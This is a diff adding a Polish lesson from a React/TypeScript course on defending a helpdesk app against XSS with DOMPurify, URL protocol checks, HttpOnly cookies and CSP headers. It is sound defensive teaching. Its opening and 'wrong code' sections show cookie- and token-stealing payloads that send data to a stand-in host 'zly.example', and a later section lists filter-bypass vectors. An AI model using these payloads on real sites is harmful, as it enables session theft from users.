@@ -1,0 +1,139 @@
+#T INTRO Rozgrzewka i problem: komentarz, który kradnie sesję
+Rozgrzewka: Ile form liczby mnogiej ma język polski? Dlaczego nie sklejasz zdań z kawałków? Do czego służy `Intl.RelativeTimeFormat`?
+
+Problem: klient prosi o formatowanie w komentarzach (pogrubienie, linki). Najprostsze rozwiązanie — wstawić HTML z backendu przez `dangerouslySetInnerHTML` — otwiera drogę do **XSS** (Cross-Site Scripting): ktoś wpisze komentarz `<img src=x onerror="fetch('https://zly.example/?c='+document.cookie)">` i każdy agent, który otworzy ticket, wykona cudzy kod. W tej lekcji poznasz, przed czym React chroni automatycznie, gdzie ta ochrona się kończy, i zabezpieczysz DevDesk: sanityzacja HTML, bezpieczne linki, sekrety, tokeny i nagłówki CSP.
+
+#T DEFINITION Co React robi za Ciebie
+React **escapuje** wszystko, co wstawiasz w JSX jako tekst: `<p>{comment.text}</p>` z treścią `<script>alert(1)</script>` wyświetli te znaki dosłownie, a nie wykona skrypt. Tak samo wartości atrybutów są wstawiane jako tekst. To domyślna i bardzo skuteczna ochrona przed XSS.
+
+Ochrona **nie działa** w miejscach, gdzie świadomie przekazujesz kod lub adres:
+- `dangerouslySetInnerHTML={{ __html: … }}` — HTML wstawiony bez escapowania,
+- `href`/`src` z adresem `javascript:…` pochodzącym od użytkownika,
+- bezpośrednie operacje na DOM (`ref.current.innerHTML = …`, biblioteki spoza Reacta),
+- `eval`, `new Function`, `setTimeout('kod')`,
+- spread props z niezaufanego obiektu na element (`<div {...userProps}>` może wstawić `dangerouslySetInnerHTML`).
+
+#T CODE_WRONG Trzy dziury w DevDesk
+```
+// 1. HTML z backendu bez sanityzacji
+<div dangerouslySetInnerHTML={{ __html: comment.html }} />
+
+// 2. Link podany przez użytkownika — "javascript:fetch('https://zly.example/'+localStorage.token)"
+<a href={ticket.externalUrl}>Link do zgłoszenia</a>
+
+// 3. Token w localStorage — każdy wstrzyknięty skrypt może go odczytać
+localStorage.setItem('token', response.accessToken);
+```
+
+#T CODE_JSX Bezpieczny HTML i bezpieczne linki (JSX)
+DOMPurify usuwa z HTML-a skrypty, atrybuty zdarzeń (`onerror`), niebezpieczne adresy i pozwala zostawić tylko wybrane znaczniki.
+```
+// SafeHtml.jsx
+import DOMPurify from 'dompurify';
+
+const ALLOWED = { ALLOWED_TAGS: ['b', 'strong', 'i', 'em', 'a', 'p', 'ul', 'ol', 'li', 'code', 'pre', 'br'], ALLOWED_ATTR: ['href'] };
+
+export function SafeHtml({ html }) {
+  const clean = DOMPurify.sanitize(html, ALLOWED);
+  return <div className="rich-text" dangerouslySetInnerHTML={{ __html: clean }} />;
+}
+
+// SafeLink.jsx
+export function safeUrl(value) {
+  try {
+    const url = new URL(value, window.location.origin);
+    return ['http:', 'https:', 'mailto:'].includes(url.protocol) ? url.href : null;
+  } catch {
+    return null;
+  }
+}
+
+export function SafeLink({ href, children }) {
+  const safe = safeUrl(href);
+  if (!safe) return <span>{children}</span>;
+  return <a href={safe} target="_blank" rel="noopener noreferrer">{children}</a>;
+}
+```
+
+#T CODE_TSX Bezpieczny HTML i bezpieczne linki (TSX)
+W TSX możesz wprowadzić **typ markowany** `SanitizedHtml` — komponent przyjmie tylko HTML, który przeszedł przez funkcję sanityzującą.
+```
+// SafeHtml.tsx
+import DOMPurify from 'dompurify';
+import type { ReactNode } from 'react';
+
+export type SanitizedHtml = string & { readonly __brand: 'SanitizedHtml' };
+
+export function sanitize(html: string): SanitizedHtml {
+  return DOMPurify.sanitize(html, {
+    ALLOWED_TAGS: ['b', 'strong', 'i', 'em', 'a', 'p', 'ul', 'ol', 'li', 'code', 'pre', 'br'],
+    ALLOWED_ATTR: ['href'],
+  }) as SanitizedHtml;
+}
+
+export function SafeHtml({ html }: { html: SanitizedHtml }) {
+  return <div className="rich-text" dangerouslySetInnerHTML={{ __html: html }} />;
+}
+
+export function safeUrl(value: string): string | null {
+  try {
+    const url = new URL(value, window.location.origin);
+    return ['http:', 'https:', 'mailto:'].includes(url.protocol) ? url.href : null;
+  } catch {
+    return null;
+  }
+}
+
+export function SafeLink({ href, children }: { href: string; children: ReactNode }) {
+  const safe = safeUrl(href);
+  if (!safe) return <span>{children}</span>;
+  return <a href={safe} target="_blank" rel="noopener noreferrer">{children}</a>;
+}
+
+// <SafeHtml html={comment.html} />            ← błąd: string nie jest SanitizedHtml
+// <SafeHtml html={sanitize(comment.html)} />  ← OK
+```
+
+#T NOTE JSX ↔ TSX — typ markowany jako bariera
+W JSX `SafeHtml` sanityzuje w środku — bezpieczne, ale ktoś może obok napisać własny `dangerouslySetInnerHTML`. W TSX **typ markowany** (`string & { __brand }`) sprawia, że jedyną drogą do uzyskania `SanitizedHtml` jest funkcja `sanitize` — przekazanie surowego tekstu to błąd kompilacji, a przegląd kodu szuka tylko rzutowań `as SanitizedHtml`. W obu wersjach dodaj regułę lintera `react/no-danger` (ostrzeżenie dla każdego `dangerouslySetInnerHTML` poza zatwierdzonym komponentem).
+
+#T DEFINITION Sekrety, tokeny i CSP
+- **Sekrety w kliencie nie istnieją** — wszystko w paczce JS (także zmienne `VITE_*`) jest publiczne. Klucze API z uprawnieniami trzymaj na backendzie.
+- **Token dostępu**: najbezpieczniej w ciasteczku `HttpOnly; Secure; SameSite=Lax/Strict` ustawianym przez Spring Boot — skrypt go nie odczyta; ochrona przed CSRF przez `SameSite` i token CSRF (Spring Security). Token w pamięci (zmienna, nie `localStorage`) z odświeżaniem przez ciasteczko to kompromis dla API z nagłówkiem `Authorization`.
+- **Content Security Policy (CSP)** — nagłówek HTTP mówiący przeglądarce, skąd wolno ładować skrypty, style, obrazy i dokąd wysyłać żądania. Nawet jeśli XSS się zdarzy, `script-src 'self'` zablokuje skrypty wstrzyknięte w treść i ładowane z obcych domen.
+- **Zależności** — `npm audit`, Dependabot/Renovate; każda biblioteka ma dostęp do całej strony.
+
+#T CODE_PRACTICAL Nagłówki bezpieczeństwa w Spring Boot
+DevDesk jest serwowany przez Spring Boot (rozdział 21) — nagłówki ustawiasz w konfiguracji Spring Security.
+```
+// SecurityConfig.java (fragment)
+http.headers(headers -> headers
+    .contentSecurityPolicy(csp -> csp.policyDirectives(
+        "default-src 'self'; " +
+        "script-src 'self'; " +
+        "style-src 'self' 'unsafe-inline'; " +
+        "img-src 'self' data: https://files.devdesk.example; " +
+        "connect-src 'self' https://api.devdesk.example; " +
+        "frame-ancestors 'none'; base-uri 'self'; form-action 'self'"))
+    .referrerPolicy(r -> r.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
+    .frameOptions(f -> f.deny()));
+
+// Ciasteczko sesji: server.servlet.session.cookie.http-only=true, secure=true, same-site=lax
+```
+
+#T STEP_BY_STEP Budujemy razem: zabezpieczamy DevDesk
+1. Dodaj w MSW komentarz z `<img src=x onerror="alert('XSS')">` i wyświetl go przez `dangerouslySetInnerHTML` — zobacz alert (tylko lokalnie!).
+2. Zastąp wyświetlanie przez `SafeHtml` z DOMPurify; sprawdź, że pogrubienie zostaje, a `onerror` znika.
+3. Pole „link zewnętrzny” ticketu wyświetlaj przez `SafeLink`; sprawdź adres `javascript:alert(1)` — renderuje się jako tekst.
+4. Przenieś token z `localStorage` do ciasteczka `HttpOnly` ustawianego przez Spring Boot (rozdział 12) i usuń kod odczytujący token w kliencie.
+5. Dodaj nagłówek CSP; w konsoli sprawdź zgłoszenia naruszeń i dopasuj politykę (najpierw `Content-Security-Policy-Report-Only`).
+6. Przejrzyj paczkę produkcyjną (`grep` w `dist/`) w poszukiwaniu kluczy i adresów wewnętrznych.
+7. Uruchom `npm audit`, włącz Dependabot i regułę `react/no-danger` w ESLint.
+
+#T PITFALL Sanityzacja „po swojemu” wyrażeniem regularnym
+`html.replace(/<script.*?>.*?<\/script>/g, '')` nie chroni przed XSS — wystarczy `<img onerror>`, `<svg onload>`, `<a href="javascript:">`, kodowanie znaków czy zagnieżdżenie `<scr<script>ipt>`. HTML parsuje się w przeglądarce w sposób, którego nie odtworzysz wyrażeniem regularnym. Używaj sprawdzonej biblioteki (DOMPurify), aktualizuj ją, a gdy to możliwe — przechowuj treść w formacie bez HTML (Markdown renderowany do komponentów React).
+
+#T SUMMARY Kryterium akceptacji i podsumowanie
+React domyślnie escapuje tekst w JSX, ale nie chroni przy `dangerouslySetInnerHTML`, adresach `javascript:`, bezpośrednich operacjach na DOM i spreadzie niezaufanych props. HTML od użytkowników sanityzuj DOMPurify z listą dozwolonych znaczników, adresy sprawdzaj przez `URL` i listę protokołów, tokeny trzymaj w ciasteczkach `HttpOnly`, sekretów nie umieszczaj w kliencie, a CSP ogranicza skutki ewentualnego XSS. W TSX typ markowany `SanitizedHtml` wymusza przejście przez sanityzację.
+
+Kryterium akceptacji: wstrzyknięty komentarz z `onerror` i link `javascript:` nie wykonują kodu, token nie jest dostępny dla skryptów, nagłówek CSP jest aktywny bez naruszeń w normalnym działaniu, a paczka produkcyjna nie zawiera sekretów.
